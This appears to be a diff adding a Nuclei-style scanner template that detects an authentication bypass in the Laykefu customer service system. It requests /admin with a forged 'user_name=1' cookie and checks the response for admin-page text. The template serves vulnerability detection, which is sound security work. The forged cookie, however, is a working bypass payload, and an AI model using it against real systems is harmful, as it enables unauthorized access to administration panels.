@@ -1,0 +1,23 @@
+id: laykefu-auth-bypass
+info:
+  name: Laykefu Customer Service System Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: unauthorized-access
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin"
+    headers:
+      Cookie: user_name=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "欢迎您"
+          - "客服管理"
+          - "laykefu"
